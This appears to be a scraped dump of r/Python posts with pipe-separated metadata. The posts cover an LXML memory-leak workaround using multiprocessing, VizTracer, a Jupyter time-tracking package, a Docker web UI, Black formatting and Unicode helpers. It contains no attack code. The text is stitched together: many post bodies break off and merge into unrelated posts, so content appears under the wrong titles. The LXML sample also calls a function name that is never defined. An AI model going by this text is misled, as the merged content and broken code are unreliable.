(The last one is particularly telling, because it apparently linked to a Ycombinator story about a developer discovering that LXML leaks, and a bunch of people responding, "yeah, we know.")

Those threads propose several solutions, including one by a Redditor (which he/she reposted here in "Thought I should share," above), for cleaning up the memory that LXML leaves behind. I tried a few of them - with the accompanying adapting / mangling of my codebase - and found that none of them were adequate, plus they had side-effects like additional delays or iteration instead of a full-document parse.

At length, I decided to scrap all of that and to solve the problem the clunky, old-old-fashioned way:

* My main code spins up a second process and hands it the XML to be processed and a multiprocessing.Queue.

* The second process uses LXML to process all of the data and puts the results back into the multiprocessing queue.

* The main code waits for the results to come through the queue, and then explicitly terminates the second process (because otherwise it hangs around in a zombie state).

For example:

    import multiprocessing, time
    from lxml import etree

    def parse_process(xml, results_queue):
        root = etree.fromstring(xml, parser=etree.XMLParser(recover=True))
        # parse data out of root into a result: list, dictionary, etc.
        results_queue.put(result)

    with open('filename.xml', 'rt') as f:
        xml = f.read()
    results_queue = multiprocessing.Queue()
    parse_process = multiprocessing.Process(target=parse_function, args=(xml, results_queue))
    parse_process.daemon = True
    parse_process.start()
    result = results_queue.get()    # blocks until results are available
    parse_process.terminate()

It's a straightforward solution to a messy issue, and it solves the problem: wiping out the second process forces all of the LXML leaked memory to be released.""|||How would you structure a python script to analyze tropes in ebooks?|||Python|||1|||2|||1601159289|||""[removed]""|||Technics, concepts and terms an intermediate programmer should know?|||Python|||1|||3|||1601158633|||""After some few months of learning Python and almost using it on a daily basis, I would consider myself more or less intermediate.

That happens to me quite a lot when I'm working with Python, and becomes the reason I built [VizTracer](https://github.com/gaogaotiantian/viztracer). 

VizTracer is helpful in many aspects, debugging, logging or profiling. The fundamental idea behind VizTracer is to help you understand what your program is doing. 

Unlike traditional debuggers, which normally pin you at a specific time and allows you to check on variables, VizTracer focuses on the call stack over time. Basically, VizTracer visualizes how functions calls each other while your program is running. 

[Recursive Fibonacci ](https://preview.redd.it/6g55u869pjp51.png?width=2286&amp;format=png&amp;auto=webp&amp;s=bdf8148c457bfc8306333a2db7a3ea808b469b05)

This is a very simple example, the program is doing a recursive fibonacci number calculation:

    def fib(n):
        if n &lt; 2:
            return 1
        return fib(n-1) + fib(n-2)

VizTracer can show how the recursive function actually works. 

VizTracer is not a toy, it can also deal with very large program.

[Monte Carlo Tree Search](https://preview.redd.it/1jy7ttqxpjp51.png?width=2282&amp;format=png&amp;auto=webp&amp;s=91ae66cc28a050e152d43a783648a0cb1ebdab40)

Above is the result of a MCTS(Monte Carlo Tree Search). You can zoom in to check the details of the program

[Details of MCTS](https://preview.redd.it/wah9oat6qjp51.png?width=1405&amp;format=png&amp;auto=webp&amp;s=0b7e823d34354d87c3f4a00bf4029909441f8e8c)

It's extremely easy to get this report. All you need to do is install VizTracer from pip:

    pip install viztracer

And instead of running your program using Python, run it with viztracer:

    viztracer your_program.py 

VizTracer will setup the necessary stuff and execute your program, then generate an html file in that folder, which you can open with Chrome. **No source code change**.

Of course, sometimes call stack is not enough. You want more information of your program. You can also achieve that with VizTracer.

VizTracer can log all your function input arguments and return values. Simply do:

    viztracer --log_function_args --log_return_value your_program.py

Then when you click your function entry in the report, you will find arguments on the bottom left corner:

&amp;#x200B;

[fib\(5\) = 8 \(this is older version, newer version has slightly different format\)](https://preview.redd.it/pli4nhegyjp51.png?width=323&amp;format=png&amp;auto=webp&amp;s=14157d667682a540f38474109426a40414b93241)

Sometimes you will find the report has too many data which you are not interested in. For example, you only want to log your own code, not any library code. You can still do it without any source code changes:

    # --run is added to resolve ambiguity
    viztracer --include_files ./ --run your_program.py

If you are already familiar with the command line arguments and want something more powerful, VizTracer provides inline features, such as a counter that can log any numerical data and display it in a separate signal on the timeline.

    counter = VizCounter(get_tracer())
    counter.a = 10 # automatically logged
    # blah blah
    # ...
    counter.a = 20 # automatically logged

I have a demo for logging "cost" value of gradient descent and it looks like this:

[cost of gradient descent](https://preview.redd.it/gkzlxxskzjp51.png?width=2297&amp;format=png&amp;auto=webp&amp;s=7d74f47180f48b788d02718594a956aa4ecafd22)

You can clearly tell the cost is getting lower over time.

These are just some examples of what VizTracer can do with minimum effort. VizTracer has a lot of other features to explore and I'm adding even more into it. 

Just like I said earlier, I'm not building a toy, so performance is also an important consideration.

The core part of VizTracer is built in pure C so the overhead is similar to cProfile, which I assume most of you are already familiar with. The worst case overhead is about 3x(with only function entry/exit). The average overhead is below 2x. You can achieve even lower with proper filters. And of course, if you want to log more stuff, there will be larger overhead. 

It supports Linux/MacOS/Windows now and the test coverage is 99.5%+ (not a toy\~). 

Maybe it's time to try a new tool to develop python :)

The heart of the library is written in C++ but there are very extensive python bindings and I have exposed part of the library for Python users to build their own tools (since I've really focused on creating a profiling _toolkit_, instead of just another profiling tool). 

Thoughts on whether packages building profiling tools would be interested in building their tools natively in Python with this toolkit? Or would the more likely just want to use the C or C++ interface and generate their own bindings? If the former, what would should the Python interface look like? 

Currently, the interface looks like [this](https://timemory.readthedocs.io/en/develop/api/python.html#individual-components), supports 50+ different types of measurements, and the components each have both relatively similar interfaces but they are each slightly customized. For example, what is returned from `get()` is specific to the component. E.g. `WallClock.get()` returns a float, `PapiVector.get()` returns a list of floats, `VoluntaryContextSwitch.get()` returns an integer, `VtuneProfiler.get()` returns a `None` (since that component just turns an attached VTune profiler on or off). Also, some member functions are no-ops, e.g. both `WallClock` and `CudaEvent` have `mark_begin()` member functions for asynchronous measurements but only `CudaEvent` actually does something (inserts structure into gpu pipeline which records a timestamp of when it was processed). I did this so that it avoid try/except blocks if the component is arbitrary set but I'd be interested in hearing opposing opinions on why this is undesirable.""|||Using Python to create CMS|||Python|||1|||1|||1601103202|||""[removed]""|||“Kite” can’t be opened because Apple cannot check it for malicious software.|||Python|||1|||2|||1601099326|||""[removed]""|||Website to run a Python Script?|||Python|||1|||2|||1601096674|||""[removed]""|||Improving Problem Solving Abilities.|||Python|||1|||5|||1601094830|||""Programmers of Reddit, how did you, as a Python programmer, improve upon your problem solving abilities?

I've used simple color schematics that could be used without any modification on sorting functions. All these coloring is done outside sorting functions, and that mean you can just copy-paste a working sort and visualize it immediately as shown in this [source code](https://github.com/jupiterbjy/Sorting_in_visual/blob/master/Sorting_algorithms_pure.py), as long as it follows this one rule:

* All sorting functions will be fed with *MutableSequence* and expect no return - result should be written on it explicitly rather than returning auxiliary array.

Any writes to aux will not be visualized - yet.

As all coloring is done in custom array class following *MutableSequence* abc and status are stored in queue, it's possible to separate or run multiple Sorting concurrently, which however is not implemented yet - since I'm not even smart enough to implement Merge-inplace even with source codes :(

I had always obsessed about saving each and every second of my time in my life. More than just saving, I was more concerned about being able  to look at where my time is going throughout the day. The led me to  install so many time management app on my mobile, after a lot of trial  and error, I found atimelogger  the best. It has all the capability what I was looking for. However,  later it started to provide only basic features in free version and  asking to pay to upgrade to have full features. Also, it has no desktop  app. I found helpless in situations, where I am on desktop and away from  my mobile.  That led me to search for more productive and free apps that were both  for mobile and desktop. Then i got to know about toggl and timecamp. However, these sites also provide very minimal features for free and require to pay for all features.

As an introvert guy, I want to know deeply about myself (  self-introspection ). So apart from just logging time and having  timesheet, I want to know detalied statistics about myself over a long  period ( &gt; 3 months ), which none of the time management tools  available on internet were providing for free. This made me feel  helpless and powerless. I want to make some new habits like reading  books and I need a tool that records how much I was being able to read  everyday.

Meanwhile, I was learning pandas and Jupyter Ipywidgets.  Suddenly, an idea came to my mind, its better to learn these Python  libraries by having a project in my mind. I already knew about datetime  in Python. So, I mentally draw a picture of making my own custom  timesheet, save in compact pandas dataframe and make a front end User  Interface using IPywidgets. It turns out to be a revolutionary idea and I  was able to make this complete GUI in the 6 months of coding. It was a  very nice and satisfying experience of being independent of any apps and  tools and using my own code for my own benefits. I become very happy  after making this. Each time i use it, i felt a kind of inner  satisfaction that cant be described in words.

After using privately for a year, another idea came about wrapping  this code into a open source python package and upload it on PyPI and  GitHub so that other experienced programmers may add new features in it.  Again, as an introvert and reserved guy, it took me more than a year to  open source my code. So, recently I learned about packaging code and  host it on PyPI and here is the result.

## What is it?
jupyter-timetracker` is a powerful python library to track, manage and analyse your time. The goal of this library to easily track your time spent in various activities and get to know more about yourself in a way that which activities you do most in a day. Also it can keep track of your daily activities for years, decades or so long. If you are too obsessive about utilising every single second of your life, it can keep track of each second of your life. Also, if you are lazy and want to track only 2-3 important activities, then you can do that also by entering those activities that matters to you.

## Main Features
Here are just a few of the things that `jupyter-timetracker` does very well :
  - **Ease of use** : To use this library, you **need not require knowledge of any programming language**. Think of it as a software where you just have to click on a few buttons and your work is done. The user interface is very simple, easy to use and self explanatory.
  - **Can record your all activities involving time**, you don't have to worry about having a handwritten timesheet, habit tracker etc. Use this library in your own creative ways.
  - **Provison of Manual Entry** :If you forget to track your activity in real time, but your remember some activities of the past then you can also manuall eneter all of your past activities.
  - **Modifying past data** : You can always edit/insert/delete any of your time entries in the past
  - **Powerful Analysis** : You can analyse how you spent your time for a particular duration on a bar chart as well as in a time matrix form let you know that on which hours of day you do that activity.
  - **Know your History** : After months of time logging, you can always look at a particular date in the past and view all the time entries of it along with the totla duration of your each activity.
  - **Supports atimelogger csv reports** : If you have used *atimelogger* app in mobile for time tracking, you can import all of your *atimelogger* data in csv format in this app. 
  - **Synchronise to external drive** : You can also synchronise your data from your external hard drive or pen drive.  
  - **Backup** : To prevent data loss from external deletion or accidently replacing file, it will keep a back of your data by default on each of your time entry by a different name containing timestamp. You can later manually delete those backups if size become too high
  
In short, You will get a clear picture of how you spend your time in a day, in a week, in a month or in a year. If you want to write an autobiography or memoir in the future , this python library can be of immense help.

## Timesheet
Timesheet is basically the main database which has all records of your entered activities. It has 5 colums, Activity Name, From ( start time ), To ( Stop Time), Notes ( optional), Duration. Duration will automatically be calculated based on your start and stop time. You need only to select your activity from the drop down Menu and enter your start and stop time. Optionally, you can add your remarks/comments in the form of notes. Below is the screenshot of my own timesheet that I have been using since August 2019. Now as you can see my timesheet database has grown up in size having more than 10000 entries and still working fine.

![Timesheet](https://raw.githubusercontent.com/PrateekKumarPython/jupyter-timetracker/master/docs/static/images/Screenshot_2020-09-20_22-43-03.png)

**Note** : If you are working on your desktop, then you don't need to enter even start and stop time, you can go in *timer* tab, select an activity and click on *green* icon. It will take start time from your system's clock. When you finished your activity just click on *red* icon to stop as you can see in the above timesheet.

## Installation
1. Make sure that you have Installed Anaconda Python in your System.
2. run `pip install jupyter-timetracker` from anaconda command prompt or linux terminal
![Timesheet](https://raw.githubusercontent.com/PrateekKumarPython/jupyter-timetracker/master/docs/static/images/Screenshot0.png)


## To Run

1. Open Jupyter Notebook and create a new Python 3 Notebook

2. Run the following Lines  
        `import timetracker`  
        `timetracker.track()`

3. A widget shoud appear for manual entry. Manually enter your first time entry for example you can enter Time spent to install and run this libray)
![Timesheet](https://raw.githubusercontent.com/PrateekKumarPython/jupyter-timetracker/master/docs/static/images/Screenshot1.png)

4. Run the cell again by `Ctrl+Enter`

5. A new widget having multiple tabs should have opened (like shown below ). Now you can enjoy tracking your time.
![Timesheet](https://raw.githubusercontent.com/PrateekKumarPython/jupyter-timetracker/master/docs/static/images/Screenshot2.png)

The first 3 lines tell you the status about whether you have imported past csv report of *atimelogger* app. If you don't use that app, then you can safely ignore these notifications.

Hi everyone,

I've been working lately on a project that involves ES and CQRS.  
I've followed DDD and Clean Architecture guidelines (or at least I've tried :) ).

The project is a banking service, that manages clients and accounts.

The domain is as follows:

* we have many clients
* each client can have many accounts
* each client can deposit and withdraw money from the account
* each account maximum debt, amount of money cannot go lower than the maximum debt

With those main rules in mind I have wrote the write side of the application (which is the main bulk of what needs to be done, the read side is just creating the projections from the events generated).

About architecture:

I have decided to use Postgres + Kafka + Kafka Connect (debezium connector) to create the mechanism of generating events for each time I add an event to the postgres table of events, and then get those events out of the postgres and into kafka using kafka connect.

I have used Postgres because of its ACID guarantees, which help in this case to make sure that data wont be corrupt (check the versioning on entities).

I'm probably not going to add any code to it anytime soon due to lack of time, so I have decided I would share it here.

The purpose of the project what for me to learn how ES works (in particular in combination with CQRS).

Would love to hear what you think, and if it helps anyone else understand the topics a little better then  its great :)""|||Beginner here please help|||Python|||1|||1|||1601029400|||""[removed]""|||Setup Fail during Python installation.|||Python|||1|||2|||1601028266|||""While i was trying to install Python 3.8.5 I got error massage :

I'm a wireless engineer (more like software developer) but I've been working with Python for quite some time now and I'm getting really good at it. I'm trying to make my portfolio but I can't seem to find the right project that motivates me. That is because I'm sooo fascinated about AI and virtual assistants, stuff like that (mind uploading, Jarvis, programming thoughts and ideas into an entity, etc). I've been looking everywhere to see if I can somehow recreate my brain in Python, or at least create a bot which would think the same way I do. I know it's nearly impossible to build a self aware bot with my current experience, but honestly I'm so motivated by it that it's all I want to do!

Before going ahead, yes, I know this is cheating. No, I don't intend to play with it. I made it to put some of my knowledge into test.

I get the game's screenshot using pyscreenshot module. Then run very basic image processing algorithms to get the character blocks isolated. This allows me to know the positions of the characters. Also lets me clean up the image for better OCR result.

Then process the individual block a bit and run through tesseract ocr engine to get the letter of the block. With the letters detected I make up words from a dictionary word list with very naive method. 

Then I decide the validity of the built up words using adjacency matrix built from the  letters and positions of them. Also build the path to make the word in the board.

Finally mouse is controlled using pyautogui to emulate drag. And voila.

Not enough to be designing according to all PEP guidelines.

In MATLAB I found it a bit confusing as to why function doc strings are supposed go *inside* the function body as opposed to above it. I was reading Uncle Bob's Clean Code book and one subchapter is about vertical spacing to convey meaning and coherence. Things that have a tight connection should not have much vertical space between them. Therefore, I found it odd to suggest to put so much space between the function header and the body by plopping down a massive docstring. This requires a lot of scrolling if you want to glimpse and the function input.

So I went to check how Python, a language focused on readability would do it, and, lo and behold, it did it the same way. Python being such a beautifully conceived language, I found it weird that this design decision was made. I have programmed a bit in Java and C# and in those languages the doc string precedes the function header, which I find much cleaner. Also if your text editor allows comment folding, you don't have a greyed out line as the first line in your function body. Preceding docstrings seem like the obvious choice to me.

TL;DR: Why does PEP suggest we put doc strings inside the function body as opposed to in front of the header?

&amp;#x200B;

Example:

Python

    def add(a, b):
        """"Docstring goes here.""""
        return(a + b)

C#

    /// Docstring goes here.
    public int add(int a, int b)
    {
        return(a + b);

I would consider myself an amateur still, but I can write a decent amount with Python, and I wanted to share the training technique that has helped me the most for those of you who are wondering where to begin.

Personally, I found that completing a course, then doing some practice questions, then completing that same course again was the best tactic. Kind of like brushing out long hair, every time you go through you get more of the tangles. As soon as the python course feels smooth, like you really understand the concepts and the example problems and can work through the logic yourself, then go back and do some more practice questions.

Coding is kind of like math, it builds upon itself. So you do need to know the base principles before you move on, but i found that hyper-focusing on understanding each module perfectly was less effective than going through more than once, cementing knowledge of a few topics each time.

It's time consuming, but it's what has worked best for me to actually learn and put it into practice.

I don't think it really matters what course you use, as long as it's the same one each time. I think reviewing the exact same wording is good instead of possibly finding other versions of the same information that might use different terminology. I think it's because there are sometimes different words for the same concept, and it's easier to learn the concept first and then the other names for it later.

Here are the resources I personally like best, but honestly most resources on python are pretty great. Just try to make sure that it's showing you the latest version of python so you're learning the most relevant syntax.

[https://www.sololearn.com/Course/Python/](https://www.sololearn.com/Course/Python/)\-great tutorials with quizzes to check your knowledge. Also, the mobile app has challenges where you can challenge other players. If 'challenge' is a main way you get motivated, this is a great app for you. You can get points and stuff and badges. It does pop up an ad asking you to buy premium every day, and there are very noninvasive ads. I barely notice them and i HATE ad-heavy apps.

[https://edabit.com/challenges/python3](https://edabit.com/challenges/python3)\-Edabit is great because you can make a free account and complete the challenges to get points and junk. You can also choose [which concepts](https://imgur.com/a/q46ti94) you want to work on, which I thought was a cool way to hone in on my weaknesses.  


After you feel super confident about everything in the course you choose, I would suggest investing the time to read the [Hitchhikers Guide to Python](https://docs.python-guide.org/), which is a great segue from learning the basic concepts of coding in python, to putting it all together to produce useful programs, API's, whatever you want.   


Notably, I have ADHD and challenge and novelty based training tends to work best for me.

(container management webui)|||Python|||1|||15|||1600879836|||""&amp;#x200B;

https://i.redd.it/31659v5ofxo51.gif

Hey guys, I just wanted to show off what I've been working on for the past few months. I started learning python on Febuary and have been writing non-stop since learning flask. I switched over to Fast API after trying to have flask act as a backend as I needed async support. If you're curious about how the different approaches compare you can check out the legacy branches to see the differences.

It's a little rough around the edges and a bit limited in it's current state but that will improve with time. Here's a rundown of the features so far:

**Container template support:**

* PortainerV1 Compatible JSON and YAML (with additional options as noted in the wiki)
* docker-compose support is a WIP
* Update templates with the click of a button and have as many as you want.

**Responsive UI:**

*  Built on VueJS
*  Vuetify Framework (So it looks nice)
*  Graphs to monitor CPU and RAM usage for each container as well as a dashboard to show stats for all running containers

Basic Container Management:

*  Start, stop, restart, kill, remove
*  Editing is a WIP

**Template Variables:**

*   Custom template variables (ie. Template has !config for the host path. You can set !config to be replaced with /path/to/config/dir so that templates can truely require no modification to run)

Here's a rundown of some of the different technologies I used/functions I had to do:

* FastAPI
* VueJS
* docker-py
* aiodocker
* Lots of JSON parsing and modification of data to convert the templates into something docker-py could use
* PyYAML
* uvicorn behind an nginx reverse proxy so the frontend and backend could be on the same port
* automating docker builds with github actions for multiple architectures
* JWT cookie authentication

Supported Architectures: linux/amd64, linux/arm, linux/arm64 

  

You can see more info here: [https://github.com/SelfhostedPro/Yacht](https://github.com/SelfhostedPro/Yacht)

If you run into issues that you don't feel warrant a github issue our discord is [https://discord.gg/KpKutvC](https://discord.gg/KpKutvC)

The wiki has some entries for templates as well as a beginners guide to help get you started.

*keep in mind that this is ALPHA so there may be bugs/issues. If you run into any please open an issue on github as I can't fix what I don't know about*

In Python 3, str is a Unicode string.
Unicode is a standard for working with a wide range of characters. Each symbol has a codepoint (a number), and these codepoints can be encoded (converted to a sequence of bytes) using a variety of encodings.

UTF-8 is one such encoding. The **low codepoints** are encoded using a single byte, and **higher codepoints** are encoded as sequences of bytes.

## ord()

Return the integer that represents the character "h":  

&gt; Output: 104  

Syntax: `ord(character)`

```
print(ord('5'))    # 53
print(ord('A'))    # 65
print(ord('$'))    # 36
```
####Smiley Code
```
x = ord("")
print(x)
```
&gt; **Output:** 128522

The `chr()` function returns the character that represents the specified unicode.

Syntax: `chr(number)`

**Example: 1**

```
x = chr(104)
print(x)       #h
```
**Example 2**

```
x = chr(128522)
print(x)       #
```

Print Smiley in range 
```
for i in range(128512,128540):
	print(chr(i),end=',')
```
**Output:**
```
,,,,,,,,,,,,,,,,
```
Let now reverse code these smiley to codes 

smileys = [,,,,,,,,,,,,,,,,]
```
for i in smileys:
	print(ord(i))
```
####Replacing smileys with characters  
```
str1 = 'We are having a good time  in Neywork '
for ch in str1:
	if(ord(ch)&gt;128510):
		str1=str1.replace(ch,'Big Smiling Face')

When the user chooses an option, the program must ask for the information to be able to calculate the area.

    black myscript.py

Lets take a look at my Python file `mathtool.py` before and after Black:

*Before:*

    """My math toolkit!"""
    def add(a,
    b):
        return a+b
    def multiply(a,b,c):return a*b                    *c

*After:*

    """My math toolkit!"""
    
    
    def add(a, b):
        return a + b
    
    
    def multiply(a, b, c):
        return a * b * c
    

&amp;#x200B;

Black works for Python files, but what about Jupyter Notebook and JupyterLab? At the moment, you can't call `black` on \*.ipynb files (and please dont try it)!  Fortunately, there are options  lets take a look at three of them:

1)	[jupyterblack](https://github.com/irahorecka/jupyterblack)  :: Black format existing \*.ipynb files using a CLI. This is useful if you'd like to tidy up existing Jupyter Notebooks or JupyterLab files.

    $ jblack my_notebook.ipynb

2)	[blackcellmagic](https://github.com/csurfer/blackcellmagic) :: Black format code cells using magic. In my opinion, this is useful if you want to tidy up specific code cells. Simply load the Jupyter Notebook extension `%load_ext blackcellmagic` and type `%%blackcellmagic` at the top of the code cell you want formatted. Execute cell and you have formatted code.

3)	[nb\_black](https://github.com/dnanhkhoa/nb_black) :: Automatically Black format every code cell when executed. This is great if you are starting a new .ipynb file. In Jupyter Notebook, load the extension using `%load_ext nb_black`, and every code cell executed thereafter will format itself.

I did some tests and it seems to only get flagged when I import any modules. It could be something as simple as: print("hello"). But if I imported something, windows defender flags it. 

I did some research and I can't seem to find any solution to this. I guess my question is: is there any way around this? is there any other way to convert python scripts to an exe? I need it to be one executable file that i can bring anywhere without the user having python installed. 

Thanks in advance for the help!

(edit) I have already tried cx\_freeze and py2exe. 

cx\_freeze creates an executable but you have to bring the folder it comes with. its not very user friendly because the user has to know which file to click on and where to look. 

From what I understand py2exe is not supported anymore.""|||The Easiest Way To Generate Fancy Avatars In Python|||Python|||1|||2|||1600701901|||""The idea for this article came to mind while I was working on a project where I have to set a default avatar for each user from the backend because I was dealing with a backend feeding two frontends, and maybe more in the future.

So, if youre dealing with a single frontend, you would better consider doing it from the frontend, because its a lot easier.

Before I start, I want to mention that the professional way to do it, is by not generating the avatar, but instead using static images for default avatars, because Its quicker, simpler, less error-prone, more future-proof, and ultimately looks better than generating them programmatically.

But, if you want to be really fancy like Google and have random colored circles and initials, youre in the right place.

* never knew where to start?
* it seemed like too much work?
* you don't like to write backend code?


[reader](https://github.com/lemon24/reader) is a Python library that allows you to make your own reader app, without having to reimplement the common logic.

*reader* allows you to:

* retrieve, store, and manage Atom and RSS feeds
* mark entries as read or important
* add tags and metadata to feeds
* filter feeds and articles
* full-text search articles
* skip all the low level stuff and focus on what makes your feed reader different

All these with a stable, clearly documented API, and excellent test coverage.

What *reader* doesn't do:

* provide an UI
* provide a REST API (yet)
* depend on a web framework
* have an opinion of how/where you use it

There is a minimal web interface, a CLI, and some plugin support, but they are all optional (and frankly, a bit unpolished).


Why make your own feed reader? So you can:

* have full control over your data
* control what features it has or doesn't have
* decide how much you pay for it
* make sure it doesn't get closed while you still use it
* really, [it's easier than you think](https://rachelbythebay.com/w/2011/10/26/fred/)

Obviously, this may not be your cup of tea, but if it is, *reader* can help.


Why make a feed reader library? I wanted a feed reader that is:

* accessible from multiple devices
* fast
* with a simple UI
* self-hosted (for privacy reasons)
* modular / easy to extend (so I can change stuff I don't like)
* written in Python (see above)
  
The fact that I couldn't find one extensible enough bugged me so much that I decided to make my own; a few years later, I ended up with what I would've liked to use when I first started.

I'm avid player of Satisfactory. In this game resources are acquired, required, produced and moved at a given rate on machines using a specific recipe. For the require scenario ("I require X parts of Y per minute") there is an elegant web interface (https://satisfactory-calculator.com/en/production-planner) that does this. However for the acquired/provide part there isn't ("I have N amounts of X and M amount of Y, how much Z can I produce per minute").

So at the core there are providers and consumers of resources and recipes in between. The amount of parts and recipes are extensive. These recipes consist of:

* Up to 4 inputs (parts), each with their own rate
* Up to two outputs (parts), each with their own rate
* Machine type
* Amount of machines
* Rate (per machine)
* Power consumption

Recipes are meant to be connected (1-N, N-1) so e.g. the input of 4 machine running one recipe and one machine running another can be the input for another machine which in turn is the input for another machine and so on and so forth. Ideally they are bi-directional so not only the one question "I require X parts of Y per minute" but also the other "I have N amounts of X and M amount of Y, how much Z can I produce per minute" should be input-able.

I tried this myself and got a mild headache and then no-where. 

So my question to you is design wise how would you approach this?""|||Pathfinding Visualization- Djikstra's Algorithm using Pygame|||Python|||1|||1|||1600687761|||""I made a pathfinding visualization.

The book is called Machine Learning from Scratch. The book provides complete derivations of the most common algorithms in ML (OLS, logistic regression, naive Bayes, trees, boosting, neural nets, etc.) both in theory and math, and then demonstrates constructions of each of these methods from scratch in Python using only numpy.

My aim with the book is to provide a very thorough rundown of the fitting process behind the algorithms we see every day. I hope that seeing the models derived in math or constructed in code helps readers understand the models at a deeper level and feel more comfortable optimizing them to their own work.

# Release Highlights

* Docker Support  
pyShelf is now fully integrated with docker. You can have a pyShelf instance up in minutes! Install docker, and docker-compose, then run docker-compose up. Your admin login:pass will be pyshelf:pyshelf. login, navigate to /admin and create a new superuser :-)
* Mobi Support  
I reworked the backend to be more modular with the importing of book files, consequently future file type support should be a bit easier. As of this release we currently support epub, and mobi filetypes. pdf, cbz, rtf &amp; txt are in the plans.
* User System  
The user system is tied into not only administering django, you can now also run a book scan on demand from the web-ui. Did I mention the favorites system?
* Favorites System  
Search for your favorite books, press the thumbs up and add it to your favorites. Login anywhere and you'll have quick access to each book.

It's been \~6 months since my last release, and I have taken alot of the feedback from the community into consideration while working on this release. As such an easy solution to get a pyShelf instance up and running quickly was of primary importance.

Along with the switch over to a more "docker centric" deployment I have also modified the infrastructure requirements most importantly no longer requiring a webserver to run the Django frontend. Instead hosting django with daphne, and serving static files via whitenoise.

pyShelf is now also running its own websocket server on port 1337, (what, it's an easy port to remember) currently it only responds to ping requests, and importBooks, expect a small client in the future. 

&gt;I live in the terminal, and knew i wanted a quick way from the terminal to remotely manage my library, I originally intended on going with plain sockets, however javascript doesn't tmk have a standard socket library, but it does have decent websocket support.

^(It's up to you whether or not you expose this port outside of a network you control, I wouldn't recommend it though, and take no responsibility if you do.)

I have alot more planned for the future of pyShelf, and look forward to your feedback. Anyone is welcome to contribute to the development of pyshelf. Just jump in to Discord (Invite link on [pyshelf.com](https://pyshelf.com)), or start making pull requests, or issues on GitHub.

Anyone who wishes to support, or donate to the development of pyShelf may do so by sponsoring on GitHub, or donating via [pyShelf.com](https://pyShelf.com)""|||Trying to make a Pygame file executable on mac.

Here's something I've been working on, a python script for simulating atmospheric seeing through a telescope. The script can be modified via simple input parameters to simulate any (realistic) telescope (magnification, telescope diameter etc) or level of seeing. It's set up in the repository to simulate the view of Jupiter through an 8" diameter amateur telescope under moderate seeing conditions. An example of this is shown below. Here's the [GitHub repository](https://github.com/dmortimer101/Telescope_Simulator).

[ Left: the input, an image of Jupiter taken by the Hubble space telescope. Right: the output of the simulation, the image of Jupiter as would be seen by an 8\\" telescope with a focal length of 1.2 meters, using a 3x Barlow lens and a CCD with 2-micron sized pixels.](https://reddit.com/link/ivc7xw/video/po95kq0pdyn51/player)

 If you're interested in what you can do with it there are a few examples in the GitHub readme so I won't repeat them here.

This was initially written as a teaching tool to teach the physics behind atmospheric seeing so I often opt for clarity over efficiency in the code. Though of course if you have a more efficient way of doing things without (significantly) increasing complexity I'd be interested to hear it!

If you are interested in learning about the physics behind this simulation there's a talk online I gave about it available [here](https://www.youtube.com/watch?v=SuoV_5ACOIo).""|||Looking for help, I have a python assignment that is hard.

I am their backend guy, I have set up their entire cluster and backend. I have been pushing for a paradigm whereby we automatically use the latest version of pip, python, and Ubuntu whenever a job is rebuilt. This setup works the vast majority of the time.

I have a few data scientists who want to stay on the "old but good" stuff. They are content to pin all of our builds on python and pip 3.6, and Ubuntu Bionic, and leave everything there forever until someone manually decides to upgrade each job.

I am concerned that we are going to end up stuck on legacy technology if we don't keep making an effort to apply the latest updates across our entire stack. The fact of the matter is that human nature is lazy, and I have observed that people will \*never\* upgrade their stuff willingly. I have seen companies get stuck, dependent upon ever diminishing support for obsolete libraries because of this.

I believe it's better to roll forward at the appropriate time, when the job is rebuilt, that way the new updates always go through the QA process along with the rest of the build. 99% of the time, if there is a problematic update in this paradigm, it will be caught by a developer or during QA.

I believe that this is truly the best path, but it is hard to get developers to go along with it, because it could potentially create more work for them.

We decided it'll be a subscription based service with monthly recurring payments. But now they don't want to continue the work and i'm all alone. So now i'm confused about the subscription policy, since sharing files is not the thing one does often so paying for it on monthly bases will be a bad idea. But i also need money to pay for the servers and domain stuff so now i'm bit confused.

About the service:

\+ It'll be purely terminal based.

\+ No need to upload your file to any server.

\+ Easy to share shortened urls.

I am a computer science student writing my final paper on the subject of Computer Control For People With Special Needs where I am using Python and OpenCV to let people who have disabilities control their computers just by looking at the screen. 

I was aiming to create an affordable software that is easy to set up and doesnt require any kind of special equipment other than a webcam. 

I have used opencv and dlib to find facial features and extract those relevant to me, basically explaining in my paper how we can use SVM (support vector machine) that uses HOG (histogram of oriented gradients) as an input to find facial landmarks. 

It is not the most advanced work as i havent written the SVM and HOG code myself but have instead used the methods provided in dlib for facial landmarks detection. 

The mouse pointer is moved discretely by looking in the direction one wants to move it. 

Unfortunately, the paper is only available in croatian language.

To make the scraping fast, I made sure that firefox installs the adblocker and image-blocker extension every time you make an instance of the browser. These two extensions are kept in the extensions folder. The program stores all the links of scraped comic pages in a JSON file and then download them using Requests. I used threading for the download function, thus making it a lot faster.

https://preview.redd.it/baolpks1ajn51.png?width=1366&amp;format=png&amp;auto=webp&amp;s=51e69d3e42c6314a0131679b4f9d16f2d9c9c2a9

After downloading all the pages of a comic, it converts the images into a single cbr file which you can open using any comic book reader. You can tell the program to either keep or delete the downloaded images using cmd-line args. There are args for other things also like image quality, browser mode, etc. To see which args do what you can run the following cmd in the terminal:

    python main.py -h

If you don't want to enter inputs using args, then just run the program:

    python main.py

and the program will ask you to enter required details one by one with options for each input provided in the brackets.

Currently, to download a comic you will first have to get its URL from the readcomiconline website and then paste it after -url args (or enter it when the program asks you):

    python main.py -url &lt;paste comic's url here&gt;

My next goal is to make a built-in search mode so that you can download a comic without the URL also. (There was a search mode but I took it down because it was not stable just like I removed the chrome support because it was slow and doesn't support extensions in headless mode.)""|||Cool python shell|||Python|||1|||1|||1600273325|||""made cli python shell.

[https://github.com/pypyr/pypyr](https://github.com/pypyr/pypyr)

&amp;#x200B;

It's free and open source, and it's all thanks to the awesome  Power of Python

&amp;#x200B;

The reason this exists, is because when you're writing automation scripts, I find myself jumping between bash/shell and a more advanced language like Python to get things done efficiently. For example. . . sometimes a quick `sed` from the cli is quicker to implement, sometimes more advanced string parsing in Python is necessary - sometimes both things are necessary at different parts in the same automation sequence! Some tools you need to invoke to automate your tasks only have CLIs, other tools only have APIs. . .   


So you end up very frequently having to code &amp; test the repetitive plumbing of sequencing tasks, parse &amp; validate cli input arguments, parse config files, write output files, handling errors, retrying commands on error, running a group of commands in a loop, invoking the cli from python or invoking python from the cli. You can of course just code all of this stuff yourself, but sometimes when you're automating something you want to get on with actually automating something, rather than deal with the more boring hardening &amp; testing variations of the basic flow control of your automation sequences.

&amp;#x200B;

